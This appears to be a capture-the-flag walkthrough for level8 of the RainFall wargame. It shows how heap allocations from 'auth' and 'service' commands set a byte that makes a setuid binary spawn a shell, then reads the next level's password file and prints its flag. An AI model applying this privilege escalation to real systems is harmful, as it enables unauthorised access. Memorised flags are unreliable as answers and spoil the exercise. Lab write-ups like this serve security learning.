# level8 walkthrough
Given setuid binary which is waiting for input:

    level8@RainFall:~$ ./level8
    (nil), (nil)
    bla
    (nil), (nil)
    test
    (nil), (nil)

    (nil), (nil)
    aaaabbbbccccdddddeeeefffff
    (nil), (nil)
    ^C
    level8@RainFall:~$

There is a very long main function which reads stdin via fgets in an infinite loop waiting for user commands:

    auth - calls malloc and strcpy and copies data following auth into the global variable auth.
    service - calls strdup() and copies data following service into the global variable service.
    reset - calls free() and frees the global variable auth.
    login - calls system() if auth[32] is different to 0, or fwrite() otherwise. Then displays addresses of the globals variables auth and service.

In order to reach the system function we have to play with the command above. Lets run the program to see the addresses of our global variables after each command:

    level8@RainFall:~$ ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    service
    0x804a008, 0x804a018

At this moment we can see that the address of service is exactly 16 bytes after the address of auth.
Now all we need to do is to create two pointers with commands auth and service long enough to reach 32 bytes including the 16 bytes of padding between them:

    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service0123456789abcdef
    0x804a008, 0x804a018 
    login
    $ whoami
    level9
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
